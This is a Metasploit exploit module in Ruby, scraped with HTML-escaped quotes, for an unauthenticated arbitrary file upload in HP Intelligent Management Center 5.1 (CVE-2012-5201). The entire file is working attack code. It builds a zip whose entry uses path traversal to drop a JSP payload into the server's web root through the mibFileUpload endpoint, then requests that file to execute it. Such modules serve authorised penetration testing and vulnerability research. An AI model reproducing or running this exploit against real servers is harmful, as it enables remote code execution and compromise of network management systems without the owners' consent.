 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking
 
  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;HP Intelligent Management Center Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
          This module exploits a code execution flaw in HP Intelligent Management Center.
        The vulnerability exists in the mibFileUpload which is accepting unauthenticated
        file uploads and handling zip contents in a insecure way. Combining both weaknesses
        a remote attacker can accomplish arbitrary file upload. This module has been tested
        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
      },
      &#039;Author&#039;       =>
        [
          &#039;rgod <rgod[at]autistici.org>&#039;, # Vulnerability Discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2012-5201&#039; ],
          [ &#039;OSVDB&#039;, &#039;91026&#039; ],
          [ &#039;BID&#039;, &#039;58385&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-13-050/&#039; ],
          [ &#039;URL&#039;, &#039;https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03689276&#039; ]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => &#039;win&#039;,
      &#039;Arch&#039; => ARCH_JAVA,
      &#039;Targets&#039;     =>
        [
          [ &#039;HP Intelligent Management Center 5.1 E0202 / Windows&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Mar 07 2013&#039;))
 
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to HP Intelligent Management Center&#039;, &#039;/imc&#039;])
      ], self.class)
  end
 
  def check
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path.to_s, "login.jsf"),
      &#039;method&#039; => &#039;GET&#039;
    })
 
    if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/
      return Exploit::CheckCode::Detected
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    @peer = "#{rhost}:#{rport}"
 
    # New lines are handled on the vuln app and payload is corrupted
    jsp = payload.encoded.gsub(/\x0d\x0a/, "").gsub(/\x0a/, "")
    jsp_name = "#{rand_text_alphanumeric(4+rand(32-4))}.jsp"
 
    # on the Java vulnerable application
    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file("../../../../../../../ROOT/#{jsp_name}", jsp)
 
    post_data = Rex::MIME::Message.new
    post_data.add_part(zip.pack, "application/octet-stream", nil, "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(4))}\"; filename=\"#{Rex::Text.rand_text_alpha(4+rand(4))}.zip\"")
 
    # Work around an incompatible MIME implementation
    data = post_data.to_s
    data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")
 
    print_status("#{@peer} - Uploading the JSP payload...")
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path.to_s, "webdm", "mibbrowser", "mibFileUpload"),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => data,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => "JSESSIONID=#{Rex::Text.rand_text_hex(32)}"
    })
 
    if res and res.code == 200 and res.body.empty?
      print_status("#{@peer} - JSP payload uploaded successfully")
      register_files_for_cleanup(jsp_name)
    else
      fail_with(Exploit::Failure::Unknown, "#{@peer} - JSP payload upload failed")
    end
 
    print_status("#{@peer} - Executing payload...")
    send_request_cgi({
      &#039;uri&#039;    => normalize_uri(jsp_name),
      &#039;method&#039; => &#039;GET&#039;
    })
 
  end
 
end

